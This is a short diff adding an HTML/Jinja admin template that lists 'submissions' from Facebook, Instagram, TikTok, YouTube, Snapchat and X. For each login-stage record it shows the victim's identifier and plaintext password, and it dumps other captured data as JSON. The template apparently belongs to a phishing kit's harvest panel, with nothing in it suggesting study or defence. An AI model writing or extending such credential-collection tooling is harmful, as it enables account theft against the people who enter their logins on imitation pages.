@@ -1,0 +1,44 @@
+
+{% extends "base.html" %}
+{% block title %}Admin - Submissions{% endblock %}
+{% block content %}
+<main class="admin-page">
+  <h1>Admin Dashboard</h1>
+  <form method="POST" onsubmit="return confirm('Clear all history?');">
+    <button class="btn danger" name="action" value="confirm_clear" type="submit">Clear All History</button>
+  </form>
+  <section class="cards">
+    {% if attempts %}
+      {% for a in attempts %}
+        <article class="card">
+          <div class="card-header">
+            <div class="platform">
+              {% if a.platform == 'facebook' %}<i class="fab fa-facebook-f"></i>
+              {% elif a.platform == 'instagram' %}<i class="fab fa-instagram"></i>
+              {% elif a.platform == 'tiktok' %}<i class="fab fa-tiktok"></i>
+              {% elif a.platform == 'youtube' %}<i class="fab fa-youtube"></i>
+              {% elif a.platform == 'snapchat' %}<i class="fab fa-snapchat-ghost"></i>
+              {% elif a.platform == 'x' %}<i class="fab fa-x-twitter"></i>{% endif %}
+            </div>
+            <div class="meta">
+              <div class="time">{{ a.ts }}</div>
+              <div class="plat-name">{{ a.platform }}</div>
+            </div>
+          </div>
+          <div class="card-body">
+            {% if a.stage == 'login' %}
+              <p><strong>Identifier:</strong> {{ a.payload.identifier }}</p>
+              <p><strong>Password:</strong> <pre>{{ a.payload.password }}</pre></p>
+              <p><strong>Format:</strong> {{ a.payload.format }}</p>
+            {% else %}
+              <pre>{{ a.payload | tojson(indent=2) }}</pre>
+            {% endif %}
+          </div>
+        </article>
+      {% endfor %}
+    {% else %}
+      <p class="empty">No submissions yet.</p>
+    {% endif %}
+  </section>
+</main>
+{% endblock %}
